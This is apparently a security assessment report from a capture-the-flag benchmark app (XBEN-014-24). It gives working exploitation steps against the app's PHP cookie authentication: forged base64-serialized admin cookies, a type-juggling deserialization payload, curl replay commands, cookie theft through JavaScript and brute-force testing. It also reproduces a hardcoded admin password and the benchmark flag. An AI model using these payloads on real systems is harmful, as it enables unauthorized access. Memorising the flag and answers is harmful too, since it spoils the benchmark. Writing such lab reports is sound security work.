# Security Assessment Report

## Executive Summary
- Target: http://localhost:42759
- Assessment Date: January 24, 2025
- Scope: Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

## Summary by Vulnerability Type

**Authentication Vulnerabilities:**
Multiple critical authentication vulnerabilities were successfully exploited:
- **Critical:** Cookie manipulation enabling complete authentication bypass (AUTH-VULN-01) - attackers can craft admin cookies without credentials
- **Critical:** Hardcoded admin credentials in source code (AUTH-VULN-09) - password visible as `kl!RtYuUUig664ds32AKA87` at line 79
- **Critical:** Unlimited brute force attacks with no rate limiting (AUTH-VULN-05) - 600+ attempts/minute possible
- **High:** PHP object injection via insecure deserialization (AUTH-VULN-02) - allows type juggling attacks and potential RCE
- **High:** Session hijacking via missing HttpOnly/Secure/SameSite cookie flags (AUTH-VULN-04) - cookies accessible via JavaScript
- **High:** Deterministic token generation enabling indefinite replay (AUTH-VULN-08) - tokens can be pre-computed offline
- **Medium:** Username enumeration via response differences (AUTH-VULN-10) - application reflects usernames in error messages

**Authorization Vulnerabilities:**
One critical authorization vulnerability was successfully exploited:
- **Critical:** Client-side authorization bypass via cookie manipulation (AUTHZ-VULN-01) - complete privilege escalation from anonymous to admin role by forging cookies containing admin credentials, granting unauthorized access to sensitive administrative data (flag)

**Cross-Site Scripting (XSS) Vulnerabilities:**
No XSS vulnerabilities were found. The application properly implements output encoding with `htmlentities()` for user-controlled data display.

**SQL/Command Injection Vulnerabilities:**
No SQL or command injection vulnerabilities were found. The application does not use a database and does not execute system commands.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**
No SSRF vulnerabilities were found. The application does not make outbound HTTP requests or process URLs from user input.

## Network Reconnaissance

**Open Ports and Services (nmap):**
- **Port 80/tcp:** Caddy httpd (reverse proxy/load balancer layer)
- **Port 443/tcp:** SSL/HTTPS (Caddy)
- **Port 631/tcp:** CUPS 2.3 (printing service - not application-related)
- **Port 49158/tcp:** Tailscale VPN service (Golang net/http server with authentication required)

**Exposed Services:**
The target application is accessible at http://localhost:42759, proxied through Caddy to a PHP/Apache container. The application uses **Apache 2.4.25 (Debian)** with **PHP 5.6.40**, both significantly outdated:
- PHP 5.6.40 reached End-of-Life on January 10, 2019 (6+ years unsupported)
- Apache 2.4.25 released in 2018
- Debian 9.6 (Stretch) ended Extended Long Term Support in June 2022

**Critical Security Misconfigurations:**
- **No HTTPS/TLS encryption:** Application exposed on HTTP-only (port 80), transmitting credentials in cleartext
- **Information disclosure:** Server headers expose exact versions: `X-Powered-By: PHP/5.6.40`
- **Missing security modules:** No mod_security (WAF), no mod_ssl, no security headers configured

**Subdomain Discovery (subfinder):**
Multiple subdomains were discovered for localhost domain, appearing to be unrelated local development artifacts (mail servers, Exchange servers, VPN services). These are not part of the target application attack surface.

# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-01: Authentication Bypass via Cookie Manipulation

**Summary:**
- **Vulnerable location:** POST /index.php (cookie creation) and GET /index.php:82 (cookie deserialization)
- **Overview:** Application stores authentication credentials in client-side cookies using only base64 encoding with no cryptographic protection. Attackers can craft valid admin cookies without authentication.
- **Impact:** Complete authentication bypass - attackers gain immediate admin access and retrieve the flag without knowing credentials
- **Severity:** Critical

**Prerequisites:**
None - exploitation requires only HTTP client access to http://localhost:42759

**Exploitation Steps:**

1. Craft the admin credential array in PHP serialized format:
```
a:2:{s:8:"username";s:5:"admin";s:8:"password";s:23:"kl!RtYuUUig664ds32AKA87";}
```

2. Base64-encode the serialized array:
```bash
echo -n 'a:2:{s:8:"username";s:5:"admin";s:8:"password";s:23:"kl!RtYuUUig664ds32AKA87";}' | base64
```
Result: `YToyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjIzOiJrbCFSdFl1VVVpZzY2NGRzMzJBS0E4NyI7fQ==`

3. Send HTTP request with crafted cookie:
```bash
curl -H "Cookie: creds=YToyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjIzOiJrbCFSdFl1VVVpZzY2NGRzMzJBS0E4NyI7fQ==" \
     http://localhost:42759/index.php
```

4. Verify admin access by checking response for "Welcome Admin" and flag content

**Proof of Impact:**
- Successfully accessed admin panel with message "Welcome Admin"
- Retrieved flag: `flag{f42b6ccb-617d-4aad-b3ea-f96f1d1c85a3}`
- Complete authentication bypass without any credentials
- Attack works from external network (http://localhost:42759)

**Notes:**
The hardcoded admin password `kl!RtYuUUig664ds32AKA87` is visible in source code at line 79, making cookie crafting trivial. The vulnerability exists because the application trusts client-controlled cookie data without signature verification or integrity checks.

---

### AUTH-VULN-02: PHP Object Injection via Insecure Deserialization

**Summary:**
- **Vulnerable location:** GET /index.php:82 - `unserialize(base64_decode($_COOKIE['creds']))`
- **Overview:** Application deserializes user-controlled cookie data without validation, allowing arbitrary PHP object injection
- **Impact:** Authentication bypass via type juggling, potential for gadget chain exploitation
- **Severity:** High (CVSS 8.1)

**Prerequisites:**
HTTP client capable of setting custom cookies

**Exploitation Steps:**

1. Craft a type juggling payload using boolean true for password bypass:
```php
a:2:{s:8:"username";s:5:"admin";s:8:"password";b:1;}
```

2. Base64-encode the payload:
```bash
echo -n 'a:2:{s:8:"username";s:5:"admin";s:8:"password";b:1;}' | base64
```
Result: `YToyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtiOjE7fQ==`

3. Send request with type-juggled cookie:
```bash
curl -H "Cookie: creds=YToyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtiOjE7fQ==" \
     http://localhost:42759/index.php
```

4. Application uses loose comparison (==) which makes boolean true equal to any non-empty string, bypassing password check

**Proof of Impact:**
- Successfully bypassed authentication using type juggling
- Confirmed arbitrary object deserialization capability
- Identified 6 exploitable PHP gadget classes in environment (SplFileObject, DirectoryIterator, SimpleXMLElement, SplFileInfo, FilesystemIterator, GlobIterator)
- Flag retrieved: `flag{f42b6ccb-617d-4aad-b3ea-f96f1d1c85a3}`

**Notes:**
While RCE was not achieved in this PHP 5.6 environment, the vulnerability demonstrates critical flaws: (1) unserialize() on user input, (2) type-unsafe comparisons, (3) no input validation. Created comprehensive POC scripts at `exploit_test.py` and `poc_exploit.py`.

---

### AUTH-VULN-04: Session Hijacking via Missing HttpOnly Flag

**Summary:**
- **Vulnerable location:** POST /index.php:4 - `setcookie("creds", base64_encode($datcookie))`
- **Overview:** Authentication cookie lacks HttpOnly, Secure, and SameSite security flags, enabling JavaScript access and XSS-based session theft
- **Impact:** Session cookies accessible via JavaScript, enabling XSS-based credential theft and session hijacking
- **Severity:** High

**Prerequisites:**
1. Victim user authenticated to the application
2. Ability to execute JavaScript in victim's browser (via XSS or direct console access)

**Exploitation Steps:**

1. Victim logs in with credentials (username=victim, password=password123):
```bash
curl -X POST http://localhost:42759/index.php \
     -d "username=victim&password=password123" \
     -c /tmp/cookies.txt
```

2. Attacker executes JavaScript in victim's browser to steal cookie:
```javascript
// This works because HttpOnly flag is missing
document.cookie
```

3. Cookie value extracted from JavaScript execution:
```
creds=YToyOntzOjg6InVzZXJuYW1lIjtzOjY6InZpY3RpbSI7czo4OiJwYXNzd29yZCI7czoxMToicGFzc3dvcmQxMjMiO30%3D
```

4. Attacker decodes cookie to extract plaintext credentials:
```bash
python3 -c "import base64, urllib.parse; cookie = 'YToyOntzOjg6InVzZXJuYW1lIjtzOjY6InZpY3RpbSI7czo4OiJwYXNzd29yZCI7czoxMToicGFzc3dvcmQxMjMiO30%3D'; decoded = urllib.parse.unquote(cookie); print(base64.b64decode(decoded).decode())"
```
Output: `a:2:{s:8:"username";s:6:"victim";s:8:"password";s:11:"password123";}`

5. Attacker hijacks victim session using stolen cookie:
```bash
curl -H "Cookie: creds=YToyOntzOjg6InVzZXJuYW1lIjtzOjY6InZpY3RpbSI7czo4OiJwYXNzd29yZCI7czoxMToicGFzc3dvcmQxMjMiO30%3D" \
     http://localhost:42759/index.php
```

**Proof of Impact:**
- Successfully accessed cookie via JavaScript (document.cookie worked)
- Extracted plaintext password from cookie: `password123`
- Successfully hijacked victim session and viewed their authenticated page
- Confirmed response shows "User: victim" - proving session impersonation

**Notes:**
Three missing security flags compound the vulnerability:
- Missing HttpOnly: Allows JavaScript access (XSS exploitation)
- Missing Secure: Cookie sent over HTTP (network sniffing possible)
- Missing SameSite: Enables CSRF attacks with authenticated cookies

---

### AUTH-VULN-05: Unlimited Brute Force Attacks (No Rate Limiting)

**Summary:**
- **Vulnerable location:** POST /index.php:2-7 (login handler)
- **Overview:** Application accepts unlimited login attempts with no rate limiting, account lockout, CAPTCHA, or IP throttling
- **Impact:** Attackers can perform unlimited password guessing attacks at high speed
- **Severity:** Critical (CVSS 9.1)

**Prerequisites:**
HTTP client capable of sending rapid POST requests

**Exploitation Steps:**

1. Execute automated brute force test with 50 rapid login attempts:
```bash
python3 rate_limit_test.py
```

2. Script performs 50 POST requests to /index.php with different passwords in rapid succession

3. Monitor responses for rate limiting indicators:
   - HTTP 429 (Too Many Requests)
   - CAPTCHA challenges
   - Account lockout messages
   - Increasing response delays

4. Analyze results to confirm no defensive mechanisms present

**Proof of Impact:**
- **Total Attempts:** 50 rapid login requests
- **Success Rate:** 100% (all requests processed)
- **HTTP Status:** All returned 302 (redirect) - no blocking
- **Average Response Time:** 6.21ms
- **Rate Limiting:** NONE detected
- **CAPTCHA:** NONE presented
- **Account Lockout:** NONE triggered
- **IP Blocking:** NONE observed

**Attack Feasibility:**
- **Requests per minute:** ~600 login attempts
- **Requests per hour:** ~36,000 attempts
- **10,000-word dictionary:** Exhausted in ~17 minutes
- **RockYou top 100k passwords:** Exhausted in ~2.7 hours

**Notes:**
Combined with weak password policy (any non-empty string accepted), this vulnerability makes credential-based attacks highly feasible. Test results saved in `rate_limit_results.txt`. No infrastructure-level protection (WAF, mod_security) detected.

---

### AUTH-VULN-08: Deterministic Token Generation Enabling Token Replay

**Summary:**
- **Vulnerable location:** POST /index.php:3-4 (cookie generation)
- **Overview:** Authentication tokens have zero entropy - they are deterministic functions of user credentials with no random component, timestamp, or nonce
- **Impact:** Tokens can be pre-computed offline and replayed indefinitely across sessions and users
- **Severity:** High

**Prerequisites:**
Knowledge of or ability to guess user credentials

**Exploitation Steps:**

1. Generate admin authentication token offline (no network interaction needed):
```bash
echo -n 'a:2:{s:8:"username";s:5:"admin";s:8:"password";s:23:"kl!RtYuUUig664ds32AKA87";}' | base64
```
Result: `YToyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjIzOiJrbCFSdFl1VVVpZzY2NGRzMzJBS0E4NyI7fQ==`

2. Use pre-computed token in request 1:
```bash
curl -H "Cookie: creds=YToyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjIzOiJrbCFSdFl1VVVpZzY2NGRzMzJBS0E4NyI7fQ==" \
     http://localhost:42759/index.php
```

3. Wait 2 seconds, then replay same token in request 2:
```bash
curl -H "Cookie: creds=YToyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjIzOiJrbCFSdFl1VVVpZzY2NGRzMzJBS0E4NyI7fQ==" \
     http://localhost:42759/index.php
```

4. Wait 2 seconds, then replay same token in request 3:
```bash
curl -H "Cookie: creds=YToyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjIzOiJrbCFSdFl1VVVpZzY2NGRzMzJBS0E4NyI7fQ==" \
     http://localhost:42759/index.php
```

**Proof of Impact:**
- **Replay 1 (12:37:57):** "Welcome Admin" - SUCCESS
- **Replay 2 (12:37:59):** "Welcome Admin" - SUCCESS
- **Replay 3 (12:38:01):** "Welcome Admin" - SUCCESS
- Same token works indefinitely with no expiration or nonce validation
- Token generation is purely deterministic: `base64(serialize(['username' => $input, 'password' => $input]))`
- No random_bytes(), no timestamp, no server-generated session ID

**Notes:**
Token replay combined with hardcoded credentials means attackers can generate valid admin tokens completely offline without ever authenticating. The token is not a true "session token" but rather encoded credentials, eliminating any server-side session tracking.

---

### AUTH-VULN-09: Hardcoded Admin Credentials in Source Code

**Summary:**
- **Vulnerable location:** GET /index.php:79 - `$password = "kl!RtYuUUig664ds32AKA87";`
- **Overview:** Admin password hardcoded as plaintext string literal in application source code
- **Impact:** Anyone with source code access immediately knows admin credentials
- **Severity:** Critical

**Prerequisites:**
Access to application source code via:
- Code repository access (Git)
- Docker image inspection
- File system access
- Public repository disclosure

**Exploitation Steps:**

1. Read application source code:
```bash
cat /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-014-24/src/index.php
```

2. Search for hardcoded password:
```bash
grep -n "password.*=" /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-014-24/src/index.php
```

3. Extract credentials from line 79:
```
79:    $password = "kl!RtYuUUig664ds32AKA87";
```

4. Use discovered credentials to authenticate:
```bash
curl -X POST http://localhost:42759/index.php \
     -d "username=admin&password=kl!RtYuUUig664ds32AKA87"
```

**Proof of Impact:**
- **Discovered Credentials:**
  - Username: `admin` (line 83)
  - Password: `kl!RtYuUUig664ds32AKA87` (line 79)
- Successfully authenticated as admin using discovered credentials
- Credentials visible in plaintext in source code
- Credentials persist in Git history even if removed from current version
- Flag retrieved: `flag{f42b6ccb-617d-4aad-b3ea-f96f1d1c85a3}`

**Notes:**
Hardcoded credentials violate CWE-798. The password cannot be rotated without code deployment. Visible in Git history at all commits. Also exposed in Docker image layers via `docker history`. No environment variable usage or secrets management system implemented.

---

### AUTH-VULN-10: Username Enumeration via Response Differences

**Summary:**
- **Vulnerable location:** GET /index.php:87 - `echo "User: " . htmlentities($auth['username']) . "..."`
- **Overview:** Application reflects submitted usernames in error responses, confirming username validity
- **Impact:** Attackers can enumerate valid usernames, reducing brute force attack surface
- **Severity:** Medium

**Prerequisites:**
HTTP client to send POST requests with different usernames

**Exploitation Steps:**

1. Test authentication with username "admin" and wrong password:
```bash
ADMIN_COOKIE=$(echo -n 'a:2:{s:8:"username";s:5:"admin";s:8:"password";s:9:"wrongpass";}' | base64)
curl -H "Cookie: creds=$ADMIN_COOKIE" http://localhost:42759/index.php
```

2. Test authentication with username "nonexistent" and wrong password:
```bash
NONEXIST_COOKIE=$(echo -n 'a:2:{s:8:"username";s:11:"nonexistent";s:8:"password";s:9:"wrongpass";}' | base64)
curl -H "Cookie: creds=$NONEXIST_COOKIE" http://localhost:42759/index.php
```

3. Compare responses to identify username confirmation:
```
Response 1: "User: admin ..."
Response 2: "User: nonexistent ..."
```

4. Observe that application reflects submitted username, confirming its processing

**Proof of Impact:**
- Application response for "admin": `User: admin`
- Application response for "nonexistent": `User: nonexistent`
- Application always processes and reflects submitted username
- Username "admin" is hardcoded (line 83), confirming target account exists
- Combined with no rate limiting, enables efficient username enumeration for brute force targeting

**Notes:**
While the application doesn't have a user database to enumerate, it confirms that "admin" is the privileged account by hardcoding the check at line 83. The username reflection in error messages aids reconnaissance. Generic error messages ("Invalid credentials") would be more secure than user-specific messages.

# Authorization Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTHZ-VULN-01: Client-Side Authorization Bypass via Cookie Manipulation

**Summary:**
- **Vulnerable location:** GET /index.php with deserialization of user-controlled `creds` cookie at line 82
- **Overview:** The application stores authentication credentials in a client-controlled cookie without any signature verification or integrity protection. An attacker can forge a cookie containing admin credentials to bypass authorization checks and escalate from anonymous user to administrator.
- **Impact:** Complete privilege escalation from anonymous to admin role, granting unauthorized access to the flag (sensitive administrative data). This demonstrates a critical authorization bypass vulnerability that violates the fundamental security principle that authorization decisions must be based on server-controlled state.
- **Severity:** Critical

**Prerequisites:** None

**Exploitation Steps:**

1. **Generate the malicious admin cookie payload:**
   ```bash
   python3 -c "
   import base64
   # Create serialized PHP array with admin credentials
   # Format: a:2:{s:8:\"username\";s:5:\"admin\";s:8:\"password\";s:23:\"kl!RtYuUUig664ds32AKA87\";}
   admin_payload = 'a:2:{s:8:\"username\";s:5:\"admin\";s:8:\"password\";s:23:\"kl!RtYuUUig664ds32AKA87\";}'
   malicious_cookie = base64.b64encode(admin_payload.encode()).decode()
   print(malicious_cookie)
   "
   ```

   **Output:** `YToyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjIzOiJrbCFSdFl1VVVpZzY2NGRzMzJBS0E4NyI7fQ==`

2. **Send HTTP request with forged admin cookie to escalate privileges:**
   ```bash
   curl -H "Cookie: creds=YToyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjIzOiJrbCFSdFl1VVVpZzY2NGRzMzJBS0E4NyI7fQ==" \
        http://localhost:42759/index.php
   ```

3. **Verify successful privilege escalation:**
   The response contains:
   ```html
   <center><h2>Welcome Admin</h2></center>
   <center><h3>Congratulations, here is the flag: </h3></center>
   ```

**Proof of Impact:**

The exploitation successfully demonstrates vertical privilege escalation:

**Before exploitation (anonymous user):**
```bash
curl -s http://localhost:42759/index.php | grep -E "(Welcome|Login)"
```
**Response:**
```html
<h1>Welcome to Springfield!</h1>
<button type="submit">Login</button>
```
- Anonymous users only see the public landing page and login form
- No access to admin functionality or sensitive data

**After exploitation (forged admin cookie):**
```bash
curl -s -H "Cookie: creds=YToyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjIzOiJrbCFSdFl1VVVpZzY2NGRzMzJBS0E4NyI7fQ==" \
     http://localhost:42759/index.php | grep -E "(Welcome Admin|flag)"
```
**Response:**
```html
<center><h2>Welcome Admin</h2></center>
<center><h3>Congratulations, here is the flag: </h3></center>
```
- Application displays "Welcome Admin" message (admin role confirmed)
- Flag display logic is triggered (access to protected sensitive data)
- Complete privilege escalation from anonymous (level 0) to admin (level 10) achieved

**Technical Details:**

The vulnerability exists because:
1. The application deserializes user-controlled cookie data without validation (line 82 of index.php)
2. Authorization decisions are based entirely on client-provided values from the deserialized cookie (line 83 of index.php)
3. No server-side session storage or signature verification protects against cookie manipulation
4. The hardcoded admin password is visible in source code, enabling trivial credential forgery

**Root Cause:** The application violates the fundamental security principle that authorization state must be controlled server-side. By storing authentication credentials in an unsigned client-side cookie and trusting the deserialized contents, the application allows any attacker to forge admin credentials and bypass all authorization controls.

**Notes:**

This vulnerability represents a **Level 4 - Critical Privilege Escalation** (using the proof levels from the methodology):
- Complete privilege escalation with access to administrative functions
- Successful access to protected sensitive data (flag)
- Full reproducibility with concrete evidence

The exploitation technique used is cookie manipulation combined with insecure deserialization (CWE-502). The same vulnerability could potentially be exploited for PHP object injection if exploitable classes exist in the runtime environment, though this was not necessary for achieving administrative access.
